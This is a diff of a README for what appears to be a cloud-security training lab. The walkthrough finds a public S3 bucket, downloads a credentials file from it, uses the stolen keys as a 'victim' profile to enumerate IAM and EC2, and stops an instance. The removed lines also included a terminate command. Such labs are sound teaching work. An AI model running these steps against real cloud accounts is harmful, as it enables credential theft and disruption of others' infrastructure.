@@ -4,12 +4,12 @@
 * Clone the repository 
 
 ```bash
-git clone https://
+git clone https://github.com/bvabhishek/misconfigured_acl.git
 ```
 * Go to Directory 
 
 ```bash
- cd /directory
+ cd /misconfigured_acl
 ```
 
 * Lets use the bucket_finder tool to check our target bucket exist or not
@@ -18,11 +18,11 @@ git clone https://
 ./bucket_finder.rb my_words
 ```
 
-* Go to the target URL
+* Go to the target URL and check if there is any attack scenario
 
     * https://vallabh.s3-us-west-2.amazonaws.com/
 
-* Let's make the s3 bucket name as export variable 
+* Let's make the s3 bucket name as gloabal variable as we need to use it again
 
 ```bash
 export s3bucket=<bucketname>
@@ -58,7 +58,7 @@ aws s3 ls s3://vallabh --profile your_name
 aws s3 ls s3://vallabh/etc/ --profile your_name
 ```
 
-* Download the juicy file 
+* Download the juicy file (Relative path to your present working directory)
 
 ```bash
 aws s3 cp s3://vallabh/etc/user.csv /home/we45-abhi/seasides/bucket_finder/ --profile your_name
@@ -89,7 +89,7 @@ aws sts get-caller-identity --profile victim
 * lets try to pull out any s3 files
 
 ```bash
-aws s3 ls --profile attacker
+aws s3 ls --profile victim
 ```
 
 * Now lets check the user policies attached to the user if any, to figure out which all resources he might have
@@ -100,22 +100,14 @@ aws iam list-attached-user-policies --user-name victim --profile victim
 
 * we came to know that he has ec2 access, now check if any running ec2 instance
 
-```bash 
-
-```
-
 * lets check if any running ec2 instance 
 
 ```bash
 
-aws ec2 describe-instances --profile victim --region eu-north-1
+aws ec2 describe-instances --profile victim --region us-west-2
 ```
 
-* Copy the Public IP address and paste in browser - scroll down for PublicIpAddress
-
-* Open new terminal 
-
-* lets export the instnce id 
+* lets export the instance id i-083b2833c663866d1
 
 ```bash
 export iId=<instance id>
@@ -124,11 +116,18 @@ export iId=<instance id>
 echo $iId
 ```
 
+* Copy the Public IP address and paste in browser
+
+```bash
+aws ec2 describe-instances --instance-ids $iId --region us-west-2 --query 'Reservations[0].Instances[0].PublicIpAddress' --output text --profile victim
+
+```
+* Open new terminal 
+
 * Lets stop the instance 
 
 ```bash
-aws ec2 stop-instances --instance-id $iId --profile victim --region eu-north-1
-aws ec2 terminate-instances --instance-id $iId --profile victim --region eu-north-1
+aws ec2 stop-instances --instance-id $iId --profile victim --region us-west-2
 
 ```
 
